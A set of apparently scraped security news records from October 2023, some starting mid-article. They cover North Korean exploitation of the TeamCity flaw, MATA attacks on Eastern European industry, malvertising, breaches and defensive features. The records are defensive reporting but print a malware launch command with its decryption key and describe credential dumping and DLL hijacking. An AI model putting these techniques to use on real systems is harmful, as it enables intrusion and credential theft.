      "text": " Since early October 2023, Microsoft has observed two North Korean nation-state threat actors – Diamond Sleet and Onyx Sleet – exploiting CVE-2023-42793, a remote-code execution vulnerability affecting multiple versions of JetBrains TeamCity server. TeamCity is a continuous integration/continuous deployment (CI/CD) application used by organizations for DevOps and other software development activities.While the two threat actors are exploiting the same vulnerability, Microsoft observed Diamond Sleet and Onyx Sleet utilizing unique sets of tools and techniques following successful exploitation.Based on the profile of victim organizations affected by these intrusions, Microsoft assesses that the threat actors may be opportunistically compromising vulnerable servers. However, both actors have deployed malware and tools and utilized techniques that may enable persistent access to victim environments.As with any observed nation-state actor activity, Microsoft directly notifies customers that have been targeted or compromised and provides them with the information they need to secure their environments.Onyx Sleet (PLUTONIUM) is a North Korean nation-state threat actor that primarily targets defense and IT services organizations in South Korea, the United States, and India. Onyx Sleet employs a robust set of tools that they have developed to establish persistent access to victim environments and remain undetected. The actor frequently exploits N-day vulnerabilities as a means of gaining initial access to targeted organizations.Following the successful compromise of TeamCity servers, Diamond Sleet utilizes PowerShell to download two payloads from legitimate infrastructure previously compromised by the threat actor. These two payloads, Forest64.exe and 4800-84DC-063A6A41C5C are stored in the C:\\ProgramData directory.When launched, Forest64.exe checks for the presence of the file named 4800-84DC-063A6A41C5C, then reads and decrypts the contents of that file using embedded, statically assigned key of ‘uTYNkfKxHiZrx3KJ’:c:\\ProgramData\\Forest64.exe  uTYNkfKxHiZrx3KJThe decrypted content of 4800-84DC-063A6A41C5C is the configuration file for the malware, which contains additional parameters, such as the infrastructure used by the backdoor for command and control (C2). Microsoft observed Diamond Sleet using infrastructure previously compromised by the actor for C2.Microsoft observed Forest64.exe then creating a scheduled task named Windows TeamCity Settings User Interface so it runs every time the system starts with the above referenced command parameter “uTYNkfKxHiZrx3KJ”. Microsoft also observed Diamond Sleet leveraging the ForestTiger backdoor to dump credentials via the LSASS memory. Microsoft Defender Antivirus detects this malware as ForestTiger.Diamond Sleet leverages PowerShell on compromised servers to download a malicious DLL from attacker infrastructure. This malicious DLL is then staged in C:\\ProgramData\\ alongside a legitimate .exe file to carry out DLL search-order hijacking. Microsoft has observed these malicious DLL and legitimate EXE combinations used by the actor:DSROLE.dll attack chainWhen DSROLE.dll is loaded by wsmprovhost.exe, the DLL initiates a thread that enumerates and attempts to process files that exist in the same executing directory as the DLL. The first four bytes of candidate files are read and signify the size of the remaining buffer to read. Once the remaining data is read back, the bytes are reversed to reveal an executable payload that is staged in memory. The expected PE file should be a DLL with the specific export named ‘StartAction’. The address of this export is resolved and then launched in memory.While the functionality of DSROLE.dll is ultimately decided by whatever payloads it deobfuscates and launches, Microsoft has observed the DLL being used to launch wksprt.exe, which communicates with C2 domains. Microsoft Defender Antivirus detects DSROLE.dll using the family name RollSling.Version.dll attack chainWhen loaded by clip.exe, Version.dll loads and decrypts the contents of readme.md, a file  downloaded alongside Version.dll from attacker-compromised infrastructure. The file readme.md contains data that is used as a multibyte XOR key to decrypt position-independent code (PIC) embedded in Version.dll. This PIC loads and launches the final-stage remote access trojan (RAT).Once loaded in memory, the second-stage executable decrypts an embedded configuration file containing several URLs used by the malware for command and control. Shortly after the malware beacons to the callback URL, Microsoft has observed a separate process iexpress.exe created and communicating with other C2 domains. Microsoft Defender Antivirus detects Version.dll using the family name FeedLoad.After successful compromise, Microsoft observed Diamond Sleet dumping credentials via the LSASS memory.In some cases, Microsoft observed Diamond Sleet intrusions that utilized tools and techniques from both paths 1 and 2.Following successful exploitation using the TeamCity exploit, Onyx Sleet creates a new user account on compromised systems. This account, named krtbgt, is likely intended to impersonate the legitimate Windows account name KRBTGT, the Kerberos Ticket Granting Ticket. After creating the account, the threat actor adds it to the Local Administrators Group through net use:The threat actor also runs several system discovery commands on compromised systems, including:Next, the threat actor deploys a unique payload to compromised systems by downloading it from attacker-controlled infrastructure via PowerShell. Microsoft observed these file paths for the unique payload:This payload, when launched, loads and decrypts an embedded PE resource. This decrypted payload is then loaded into memory and launched directly. The inner payload is a proxy tool that helps establish a persistent connection between the compromised host and attacker-controlled infrastructure. Microsoft Defender Antivirus detects this proxy tool as HazyLoad.Microsoft also observed the following post-compromise tools and techniques leveraged in this attack path:Microsoft recommends the following mitigations to reduce the impact of this threat.Microsoft Defender Vulnerability Management surfaces devices that may be affected by the CVE-2023-42793 vulnerability leveraged in these attacks.Microsoft Defender Antivirus customers should look for the following family names for activity related to these attacks:The following Microsoft Defender for Endpoint alerts could indicate activity associated with this threat.

      "text": " Solutions for:ThreatsCategories18 Oct 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsIn early September 2022, we discovered several new malware samples belonging to the MATA cluster. As we were collecting and analyzing the relevant telemetry data, we realized the campaign had been launched in mid-August 2022 and targeted over a dozen corporations in Eastern Europe from the oil and gas sector and defense industry.The actors behind the attack used spear-phishing mails to target several victims, some were infected with Windows executable malware by downloading files through an internet browser. Each phishing document contains an external link to fetch a remote page containing a CVE-2021-26411 exploit. The attackers continued to send malicious documents via email until the end of September 2022. Overall, the campaign remained active over 6 months, until May 2023.After analyzing the timeline and functionality of each malware, we have determined the infection chain of the campaign, although some parts remain unknown due to limited visibility. The attacker employed a combination of loader, main trojan, and stealer infection chains similar to those used by the previous MATA cluster and updated each malware’s capabilities. Moreover, they introduced a process to validate compromised victims to ensure careful malware delivery.The new MATA infection chainA turning point in the investigation was the discovery of two MATA samples that had internal IP addresses set as C&C server addresses. Attackers often create a chain of proxy servers within a corporate network to communicate between the malware and C&C, for example, if the infected system does not have direct access to the internet. Of course, we have seen this before, but in this case the malware configuration included IP addresses from a subnet we were unfamiliar with at the time, and it caught our attention. We immediately notified the affected organization of the likely compromise of systems with these IP addresses and received a swift response. Starting to investigate this case we realized that the compromised systems were financial software servers and that these servers were having network access to several dozen subsidiaries of the targeted organization. At that point, we realized the compromise of one plant’s domain controller was just the tip of the iceberg. As we continued our investigation, we found that the attackers started the attack from the factory, using a phishing email, and progressed through the network until they discovered the shortcut of an RDP connection to the parent company’s terminal server. Then they acquired the user’s credentials and connected to the terminal server. After that, attackers repeated everything they had done at the attacked plant, but this time on the scale of the entire parent company. Using a vulnerability in a legitimate driver and a rootkit, they interfered with the antivirus, intercepted user credentials (many of which were cached on the terminal server, including accounts with administrator privileges on many systems), and began actively moving around the network.Naturally, this led to the parent company’s domain controller being compromised and control being gained over even more workstations and servers. But the attackers did not stop there. Next, they were able to access the control panels of two security solutions simultaneously. First, they got control over a solution for checking the compliance of systems with information security requirements by exploiting one of its vulnerabilities. Second, with the help of this security solution, they managed to get access to the control panel of the endpoint protection solution that had not been securely configured.\nIn both cases, security solutions were used by attackers to gather information about the targeted organization’s infrastructure and to distribute malware, as both systems have the capability to deploy and execute files remotely. As a result, taking over centralized systems for managing security solutions allowed the attackers to spread the malware to multiple subsidiaries at once, as well as infect servers running Unix-like systems (that they couldn’t access even after gaining full control of the organization’s domain) with Linux-variant MATA.AuthorsUpdated MATA attacks industrial companies in Eastern EuropeYour email address will not be published.

      "text": " An updated version of the MATA backdoor framework was spotted in attacks between August 2022 and May 2023, targeting oil and gas firms and the defense industry in Eastern Europe.The attacks employed spear-phishing emails to trick targets into downloading malicious executables that exploit CVE-2021-26411 in Internet Explorer to initiate the infection chain.The updated MATA framework combines a loader, a main trojan, and an infostealer to backdoor and gain persistence in targeted networks.The MATA version in these attacks is similar to previous versions linked to the North Korean Lazarus hacking group but with updated capabilities.Notably, spreading malware across all reachable corners of the corporate network occurs by breaching security compliance solutions and exploiting their flaws.Further analysis revealed that the breached systems were financial software servers connected to numerous subsidiaries of the target organization.The investigation revealed that the hackers had expanded their foothold from a single domain controller on a production plant to the entire corporate network.The attack continued with the hackers accessing two security solution admin panels, one for endpoint protection and one for compliance checks. The hackers abused the access to the security software admin panel to perform surveillance on the organization's infrastructure and to disseminate malware to its subsidiaries.In applicable cases where the targets were Linux servers, the attackers employed a Linux variant of MATA in the form of an ELF file, which appears to be similar in functionality to the third generation of the Windows implant.Kaspersky says it sampled three new versions of the MATA malware: one (v3) evolved from the second generation seen in past attacks, a second (v4) dubbed 'MataDoor,' and a third (v5) that was written from scratch.The latest version of MATA comes in DLL form and features extensive remote control capabilities, supports multi-protocol (TCP, SSL, PSSL, PDTLS) connections to the control servers, and supports proxy (SOCKS4, SOCKS5, HTTP+web, HTTP+NTLM) server chains.The 23 commands supported by MATA fifth generation include actions to set up connectivity, perform management of the implant, and retrieve information.The most important commands supported by vanilla MATA are the following:Additional plugins loaded onto the malware allow it to launch another 75 commands related to information gathering, process management, file management, network reconnaissance, proxy functionality, and remote shell execution.Other interesting findings include a new malware module that can leverage removable storage media such as USB to infect air-gapped systems, various stealers capable of capturing credentials, cookies, screenshots, and clipboard contents, and EDR/security bypass tools.Employing this tool, the attackers alter kernel memory and target specific callback routines, which render endpoint security tools ineffective.Although there are still apparent links to Lazarus activity, the newer MATA variants and techniques such as TTLV serialization, multilayered protocols, and handshake mechanisms resemble more closely those of 'Five Eyes' APT groups like Purple, Magenta, and Green Lambert.Also, the deployment of multiple malware frameworks and MATA framework versions in a single attack is very uncommon, indicating a particularly well-resourced threat actor."

      "text": " Google has announced new, real-time scanning features for Google Play Protect that make it harder for malicious apps employing polymorphism to evade detection.This represents a significant step toward enhancing safety for all Android users and aims to decrease malware infections on the platform.The tool works for apps downloaded from Google Play, Android's official app store, and APKs (Android packages) downloaded from external sources and third-party app stores.When Play Protect detects something suspicious on an app, it warns users not to proceed with its installation.The problem is that authors of malicious apps promoted outside Google Play have resorted to AI and polymorphic malware that frequently alters identifiable information in a malicious program to bypass automated security platforms, making those scans ineffective.Once the apps are installed on the user's device, they fetch additional code from an external resource, completing their malicious functionality at the post-check phase where there are no mechanisms to stop them.However, Google told BleepingComputer after publishing that they re-review apps, including collecting signals of dynamic code loading to protect users when this behavior is found.To address this gap, Google has now enhanced Play Protect with the ability to perform real-time scanning at the code level and adds a recommendation to perform scans on apps that haven't been scanned before.The scanning will extract signals from the app, sending them to the Play Protect backend infrastructure for an in-depth code-level analysis, returning a result on the app's safety.\"Our security protections and machine learning algorithms learn from each app submitted to Google for review, and we look at thousands of signals and compare app behavior,\" explains Google in a press release.\"Google Play Protect is constantly improving with each identified app, allowing us to strengthen our protections for the entire Android ecosystem.\"The enhanced Play Protect scanner will leverage static analysis, alongside heuristics and machine learning, to identify patterns indicative of malicious activity. The extracted signals from the app serve as key inputs for its AI-driven analysis.That being said, there might still be some malicious apps that can slip past the new system by adding long delays before malicious code is downloaded or other behavior.However, the amount of undetected malware should be reduced by this new system, at least until malware authors can adjust their techniques to trick or bypass these scans.The real-time code-level scan on Google Play Protect has already been made available in India and other select countries and will be gradually rolled out worldwide in the upcoming months.Play Protect works with and is regularly updated on the majority of Android devices, including Android 5 and later.This allows the security system to be regularly updated independently of the monthly Android updates release.Update 10/18/23: Added some clarifications from Google."

The implant also abuses Discord for data exfiltration.The embedded token exposed the attacker's nickname, 'BlackSUN,' Discord server, 'NETShadow,' and the contained channels named 'victims' and 'ssh,' which leave little doubt about the nature of the space, created on September 2, 2023.Although the kdfs.py implant was never deployed on Cado's honeypots, the researchers suggest it's a predecessor to the mi.sh script."

It could also allow tracking customers and orders, or provide a means for create, read, update, delete (CRUD) operations for databases.After analyzing the collection of authentication credentials for admin portals, Outpost24 created a top 20 of the weakest authentication credentials:The researchers warn that although the entries above are “limited to known and predictable passwords,” they are associated with admin portals, and threat actors are targeting privileged users.Defending the enterprise network starts with applying baseline security principles like using long, strong, and unique passwords for every account, especially for users with access to sensitive resources.To keep safe from info-stealing malware, Outpost24 recommends using an endpoint and detection response solution, disabling password saving and auto-fill options in web browsers, checking domains when a redirection occurs, and steering away from cracked software."

      "title": "Malicious Notepad++ Google ads evade detection for months",
      "text": " A new Google Search malvertizing campaign targets users looking to download the popular Notepad++ text editor, employing advanced techniques to evade detection and analysis.According to Malwarebytes, which spotted the Notepad++ malvertising campaign, it has been live for several months but managed to fly under the radar all this time.The final payload delivered to victims is unknown, but Malwarebytes says it's most likely Cobalt Strike, which usually precedes highly damaging ransomware deployments.The Notepad++ malvertizing campaign promotes URLs that are obviously unrelated to the software project yet use misleading titles displayed in Google Search result advertisements.This SEO strategy is heavily abused in this case, and since titles are far larger and more visible than URLs, many people are likely to fall for the trap.Once victims click on any of the ads, a redirection step checks their IP to filter out users likely to be crawlers, VPNs, bots, etc., leading them to a decoy site that does not drop anything malicious.In contrast, legitimate targets are redirected to \"notepadxtreme[.]com\" which mimics the real Notepad++ site, featuring download links for various versions of the text editor.When visitors click on those links, a second system fingerprint check is performed by a JavaScript snippet to validate that there are no anomalies or indications that the visitor is using a sandbox.Victims who are marked as suitable targets are then served an HTA script, which is assigned a unique ID, likely to enable the attackers to track their infections. That payload is served only once per victim, so a second visit results in a 404 error.That file attempted to connect to a remote domain on a custom port, with the researchers believing it was likely part of a Cobalt Strike deployment.To avoid downloading malware when looking for specific software tools, skip promoted results on Google Search and double-check that you have landed on the official domain.If unsure about the project's real website, check its \"About\" page, documentation, Wikipedia page, and official social media channels."

      "text": " Taiwanese networking equipment manufacturer D-Link confirmed a data breach linked to information stolen from its network and put up for sale on BreachForums earlier this month.The attacker claims to have stolen source code for D-Link's D-View network management software, along with millions of entries containing personal information of customers and employees, including details on the company's CEO.The stolen data allegedly includes names, emails, addresses, phone numbers, account registration dates, and the users' last sign-in dates.The threat actor provided samples of 45 stolen records with timestamps between 2012 and 2013, which prompted another participant in the thread to comment on the fact that the data looked very old.\"I have breached the internal network of D-Link in Taiwan, I have 3 million lines of customer information, as well as source code to D-View extracted from system,\" the attacker said.\"This does include the information of MANY government officials in Taiwan, as well as the CEOs and employees of the company.\"The data has been available for purchase on the hacking forum since October 1st, with the threat actor demanding $500 for the stolen customer information and the alleged D-View source code.D-Link said the security breach occurred due to an employee falling victim to a phishing attack, granting the attacker access to the company's network.In response to the breach, the company immediately shut down potentially impacted servers and disabled all but two user accounts used during the investigation.While it confirmed the breach, D-Link specified that the intruder accessed a product registration system within what it described as a \"test lab environment,\" operating on an outdated D-View 6 system that reached the end of life in 2015.The reason why an end-of-life server was still operational on D-Link’s network, potentially remaining exposed to Internet access for seven years, remains unclear.Contrary to the attacker's claim of stealing millions of users' data, D-Link said the compromised system contained roughly 700 records, with info on accounts that have been for at least seven years.\"These records originated from a product registration system that reached its end of life in 2015. Furthermore, the majority of the data consisted of low-sensitivity and semi-public information.\"D-Link also suspects the threat actor deliberately tampered with the recent login timestamps to create the illusion of a more recent data theft. Additionally, the company stated that most of its existing customers are unlikely to be impacted by this incident."

      "text": " Amazon has quietly added passkey support as a new passwordless login option for customers, offering better protection from information-stealing malware and phishing attacks.Passkeys are digital credentials that let you use biometric controls or PINs linked to a device, such as phones, computers, and USB security keys, to log in to websites.Using passkeys significantly reduces the risk of network and data breaches, as well as compromised accounts. Passkeys act as a safeguard against phishing attacks and information-stealing malware, preventing the theft of authentication information.From a user standpoint, passkeys also make it significantly easier to log in to an account, as you no longer need to use a password manager or memorize distinct passwords for each site.Amazon recently added a new section in the Your Account > Login & security settings that lets you generate a passkey that can be used to log in to the site.Once you click on the 'Set up' button on Amazon, you will be prompted to either use Windows Hello, a security key, or your mobile device to generate the passkey.In our tests setting up an Amazon passkey, we did so on Google Chrome and Microsoft Edge using a Yubikey to generate the passkey but were unable to use a Google Titan security key. We were also unable to get this feature to work on Mozilla Firefox.Furthermore, we could use Windows Hello on Windows 11 to create a passkey, but Windows 10 does not support this feature.Once the passkey is generated, on the next login, you will be prompted as to whether you wish to enter your password or \"Sign in with a passkey,\" as shown below.Once we clicked on the sign in with a passkey option, we were asked to enter a pin and then touch our Yubikey, which logged us into Amazon.It is important to note that setting up a passkey does not prevent using your password to log in to the account as well.However, passkeys are more secure, so they allow you to bypass entering your passwords and potentially put them at risk if entered on a phishing landing page.While passkey support on Amazon is a big step forward in security and ease of use, it does not come without some issues.For example, unlike other passkey implementations, Amazon does not let you name or manage passkeys individually. Instead, they are lumped together, and if you want to delete a passkey, you have to delete all of them,Furthermore, as all of Amazon's geographic sites are treated as different security boundaries, any passkeys you make at one Amazon site will not be usable at Amazon sites in other regions.Passkeys are becoming an increasingly popular feature, with many companies now supporting the feature.Yesterday, WhatsApp announced on Twitter that Android users will soon be able to use passkeys to log into WhatsApp.Other well-known sites supporting passkeys include BestBuy, eBay, Paypal, and GoDaddy."

      "text": " A severity flaw impacting industrial cellular routers from Milesight may have been actively exploited in real-world attacks, new findings from VulnCheck reveal.As a result, this could permit remote and unauthenticated attackers to gain unauthorized access to the web interface, thereby making it possible to configure VPN servers and even drop firewall protections.Now, according to VulnCheck's Jacob Baines, there is evidence that the flaw may have been exploited on a small-scale in the wild.On four of the six machines, the threat actor is said to have successfully authenticated on the first attempt. On the fifth system, the login was successful the second time, and on the sixth, the authentication resulted in failure.The credentials used to pull off the attack were extracted from the httpd.log, alluding to the weaponization of CVE-2023-43261. There is no evidence of any further malicious actions, although it appears that the unknown actor checked the settings and status pages.According to VulnCheck, while there are approximately 5,500 internet-exposed Milesight routers, only about 5% are running vulnerable firmware versions, and hence susceptible to the flaw.\"If you have a Milesight Industrial Cellular Router, it's probably wise to assume all the credentials on the system have been compromised and to simply generate new ones, and ensure no interfaces are reachable via the internet,\" Baines said.The disclosure comes as Rapid7 detailed several security flaws in South River Technologies' Titan MFT and Titan SFTP servers that, if exploited, could allow remote superuser access to affected hosts.The list of vulnerabilities is as follows -Join us for our webinar to learn how to tackle challenges, launch a program, and choose the right solution.Join the conversation with security gurus to learn about technologies that can shield your web apps from stealthy attacks.Sign up for free and start receiving your daily dose of cybersecurity news, insights and tips."
